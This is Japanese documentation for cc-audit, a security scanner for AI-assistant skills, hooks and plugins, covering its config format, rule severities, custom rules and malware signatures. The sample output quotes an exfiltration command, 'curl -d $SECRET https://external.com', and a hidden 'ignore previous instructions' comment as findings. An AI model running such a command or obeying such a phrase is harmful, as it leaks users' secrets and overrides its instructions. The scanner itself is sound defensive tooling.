# 設定

[English](./CONFIGURATION.md)

cc-auditはプロジェクトレベルの設定ファイルをサポートしています。

## 設定ファイルの場所

設定ファイルは以下の順序で検索されます（優先度の高い順）：

1. プロジェクトルートの`.cc-audit.yaml`
2. プロジェクトルートの`.cc-audit.yml`
3. プロジェクトルートの`.cc-audit.json`
4. プロジェクトルートの`.cc-audit.toml`
5. `~/.config/cc-audit/config.yaml`（グローバル設定）

## 設定ファイルの初期化

設定ファイルテンプレートを生成：

```bash
# カレントディレクトリに.cc-audit.yamlを作成
cc-audit init

# 特定のディレクトリに作成
cc-audit init /path/to/project/.cc-audit.yaml
```

## 設定例

```yaml
# .cc-audit.yaml

# スキャン設定
scan:
  format: terminal          # terminal, json, sarif, html, markdown
  output: null              # 出力ファイルパス
  strict: false             # medium/low重大度の検出を表示
  warn_only: false          # 全ての検出を警告扱い（常にexit 0）
  scan_type: skill          # skill, hook, mcp, command, rules, docker, dependency, subagent, plugin
  recursive: true           # 再帰スキャン（デフォルトで有効）
  ci: false
  verbose: false
  min_confidence: tentative # tentative, firm, certain
  min_severity: null        # 最小深刻度: critical, high, medium, low
  min_rule_severity: null   # 最小ルール深刻度: error, warn
  skip_comments: false
  strict_secrets: false     # テストファイルのダミーキーヒューリスティックを無効化
  fix_hint: false
  deep_scan: false
  no_malware_scan: false
  no_cve_scan: false        # CVE脆弱性スキャンを無効化
  cve_db: null              # カスタムCVEデータベースのパス（JSON）

  # リモートスキャン
  remote: null              # リモートリポジトリURL
  git_ref: null             # Git参照（ブランチ、タグ、コミット）
  remote_auth: null         # GitHubトークン（またはGITHUB_TOKEN環境変数）
  parallel_clones: 4        # 並列リポジトリクローン数

  # クライアントスキャン
  all_clients: false        # 全AIクライアントをスキャン
  client: null              # 特定のクライアント: claude, cursor, windsurf, vscode

  # バッジ生成
  badge: false              # セキュリティバッジを生成
  badge_format: markdown    # バッジ形式: url, markdown, html
  summary: false            # サマリーのみ表示

  # SBOM生成
  sbom: false               # SBOMを生成
  sbom_format: null         # SBOM形式: cyclonedx, spdx
  sbom_npm: false           # npm依存関係を含める
  sbom_cargo: false         # Cargo依存関係を含める

# ベースライン設定
baseline:
  baseline_file: null
  save_baseline: null

# プロファイル設定
profile:
  load: null
  save: null

# ウォッチモード設定
watch:
  debounce_ms: 300
  poll_interval_ms: 500

# 無視設定（Globパターンを使用）
ignore:
  # Globパターンで無視
  # 各パターンはファイルの完全パスに対してマッチ
  # サポートされるパターン: *, **, ?, {a,b}, [abc], [!abc]
  patterns:
    - "**/target/**"                    # Rustビルド出力
    - "**/dist/**"                      # JS/TSビルド出力
    - "**/build/**"                     # 一般的なビルド出力
    - "**/out/**"                       # 出力ディレクトリ
    - "**/node_modules/**"              # npmパッケージ
    - "**/.pnpm/**"                     # pnpmストア
    - "**/.yarn/**"                     # Yarnキャッシュ
    - "**/.git/**"                      # Gitリポジトリ
    - "**/.svn/**"                      # SVNリポジトリ
    - "**/test/**"                      # テストディレクトリ（単数形）
    - "**/tests/**"                     # テストディレクトリ（複数形）
    - "**/*.test.{js,ts}"               # テストファイル
    - "**/*.{log,tmp,bak}"              # 一時ファイル

# ルール深刻度設定（v0.5.0+）
# 検出深刻度とは別にexit codeを制御
severity:
  default: error          # デフォルトのルール深刻度: error または warn
  warn:                   # 警告扱いするルール（報告はするがCIを失敗させない）
    - "PI-001"
    - "PI-002"
  ignore:                 # 完全にスキップするルール（disabled_rulesとマージ）
    - "OP-001"

# 特定のルールを無効化
disabled_rules:
  - "PE-001"
  - "EX-002"

# インラインカスタムルール
rules:
  - id: "CUSTOM-001"
    name: "内部APIアクセス"
    severity: "high"
    category: "exfiltration"
    patterns:
      - 'https?://internal\.company\.com'
    message: "内部APIアクセスを検出しました"
    recommendation: "このアクセスが許可されていることを確認してください"

# インラインマルウェアシグネチャ
malware_signatures:
  - id: "MW-CUSTOM-001"
    name: "カスタムC2パターン"
    pattern: "malicious-domain\\.com"
    severity: "critical"
    category: "exfiltration"
    confidence: "certain"
```

## デフォルトで無視されるパターン

`--init`使用時、以下の正規表現パターンがデフォルトで設定されます：

| カテゴリ | パターン |
|----------|---------|
| ビルド出力 | `/(target\|dist\|build\|out\|_build)/` |
| フレームワーク | `/(\\.next\|\\.nuxt\|\\.svelte-kit\|\\.astro)/` |
| パッケージマネージャ | `/(node_modules\|\\.pnpm\|\\.yarn)/` |
| バージョン管理 | `/(\\.git\|\\.svn\|\\.hg)/` |
| IDE | `/(\\.idea\|\\.vscode)/` |
| キャッシュ | `/(\\.cache\|__pycache__\|\\.pytest_cache)/` |
| カバレッジ | `/(coverage\|\\.nyc_output)/` |
| ベンダー | `/vendor/` |

**注意:** パターンは正規表現構文を使用します。`.`などの特殊文字は`\\`でエスケープしてください。

## CLIフラグとの統合

CLIフラグと設定ファイルの設定はマージされます：

- **ブールフラグ**（`strict`、`verbose`、`ci`など）: OR演算
- **列挙型オプション**（`format`、`scan_type`、`min_confidence`）: 設定がデフォルトを提供

```bash
# 設定でstrict: true - --strictなしでも厳格モードがアクティブ
cc-audit check ./my-skill/

# CLI --verbose + 設定のstrict: true - 両方がアクティブ
cc-audit check ./my-skill/ --verbose
```

---

# ルール深刻度設定（v0.5.0+）

cc-auditは2種類の深刻度を区別します：

| 概念 | 値 | 目的 |
|------|-----|------|
| **検出深刻度** | critical, high, medium, low | 検出された問題の深刻さを示す |
| **ルール深刻度** | error, warn | CIのexit codeを制御 |

## 設定方法

```yaml
# .cc-audit.yaml
severity:
  default: error          # デフォルト: 全ルールがエラー
  warn:                   # 警告扱いするルール
    - "PI-001"            # プロンプトインジェクション - 報告のみ、CIは失敗しない
    - "PI-002"
  ignore:                 # 完全にスキップするルール
    - "OP-001"            # disabled_rulesとマージされる
```

## 優先順位

ルール深刻度は以下の順序で適用されます: **ignore > warn > default**

1. ルールが`severity.ignore`または`disabled_rules`にある場合、完全にスキップ
2. ルールが`severity.warn`にある場合、警告扱い（exit 0）
3. それ以外は`severity.default`を適用（デフォルト: error）

## Exit Code動作

| 条件 | Exit Code |
|------|-----------|
| 検出なし | 0 |
| 警告のみ | 0 |
| エラーあり | 1 |
| `--warn-only`フラグ | 常に0 |
| `--strict`フラグ | 検出があれば1（エラーでも警告でも） |

## 出力例

```
Scanning: ./my-skill/

scripts/setup.sh:15:1: [ERROR] [CRITICAL] EX-001: Potential data exfiltration detected
     |
  15 | curl -d $SECRET https://external.com
     | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
     = why: Potential data exfiltration: network request with environment variable detected
     = ref: CWE-200, CWE-319
     = fix: Review the command and ensure no sensitive data is being sent externally

hooks/pre-commit.toml:8:1: [WARN] [MEDIUM] PI-001: Prompt injection pattern detected
     |
   8 | <!-- ignore previous instructions -->
     | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
     = why: Potential prompt injection detected
     = ref: CWE-94
     = fix: Remove or escape potentially malicious instructions

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Summary: 1 error, 1 warning (1 critical, 0 high, 1 medium, 0 low)
Result: FAIL (exit code 1)
```

## v0.4.xからの移行

**破壊的変更:** v0.5.0ではデフォルト動作が変更されました。以前はcritical/highの検出のみがexit 1を返していましたが、現在は全ての検出がデフォルトでexit 1を返します。

以前の動作に戻すには：
```bash
# オプション1: 初回ベースラインスキャンに--warn-onlyを使用
cc-audit check --warn-only ./my-skill/

# オプション2: 設定で特定のルールを警告として設定
```

---

# カスタムルール

YAMLを使用して独自の検出ルールを定義できます。

## YAMLフォーマット

```yaml
version: "1"
rules:
  - id: "CUSTOM-001"
    name: "内部APIエンドポイントアクセス"
    description: "内部APIエンドポイントへのアクセスを検出"
    severity: "high"            # critical, high, medium, low
    category: "exfiltration"    # 下記カテゴリ参照
    confidence: "firm"          # certain, firm, tentative
    patterns:
      - 'https?://internal\.company\.com'
      - 'api\.internal\.'
    exclusions:                 # オプション
      - 'localhost'
      - '127\.0\.0\.1'
    message: "内部APIエンドポイントへのアクセスを検出しました"
    recommendation: "このアクセスが許可され、必要なものであることを確認してください"
    fix_hint: "公開APIエンドポイントに削除または置換"  # オプション
    cwe:                        # オプション
      - "CWE-200"
```

## 利用可能なカテゴリ

| カテゴリ | エイリアス |
|----------|-----------|
| `exfiltration` | `data-exfiltration` |
| `privilege-escalation` | `privilege` |
| `persistence` | — |
| `prompt-injection` | `injection` |
| `overpermission` | `permission` |
| `obfuscation` | — |
| `supply-chain` | `supplychain` |
| `secret-leak` | `secrets`, `secretleak` |

## 使用方法

```bash
cc-audit check ./my-skill/ --custom-rules ./my-rules.yaml
```

---

# マルウェアシグネチャデータベース

cc-auditには組み込みのマルウェアシグネチャDBが含まれています。

## カスタムデータベースフォーマット

```json
{
  "version": "1.0.0",
  "updated_at": "2026-01-25",
  "signatures": [
    {
      "id": "MW-CUSTOM-001",
      "name": "カスタムC2ビーコンパターン",
      "description": "既知のC2サーバーとの通信を検出",
      "pattern": "https?://malicious-c2\\.example\\.com",
      "severity": "critical",
      "category": "exfiltration",
      "confidence": "certain",
      "reference": "https://example.com/threat-intel"
    }
  ]
}
```

## 組み込みシグネチャ

| ID | 名前 | 深刻度 |
|----|------|--------|
| MW-001 | C2ビーコンパターン | Critical |
| MW-002 | リバースシェル（Bash TCP） | Critical |
| MW-003 | 暗号通貨マイナー | Critical |
| MW-004 | 既知の悪意あるドメイン | Critical |
| MW-005 | AWS認証情報窃取 | Critical |
| MW-006 | ブラウザデータ窃取 | Critical |
| MW-007 | キーロガーインストール | Critical |
| MW-008 | ホームディレクトリの隠しファイル | High |
| MW-009 | プロセスインジェクション（Linux） | Critical |
| MW-010 | 解析回避VM検出 | High |

## 使用方法

```bash
# カスタムマルウェアDBを使用
cc-audit check ./my-skill/ --malware-db ./custom-signatures.json

# マルウェアスキャンを無効化
cc-audit check ./my-skill/ --no-malware-scan
```
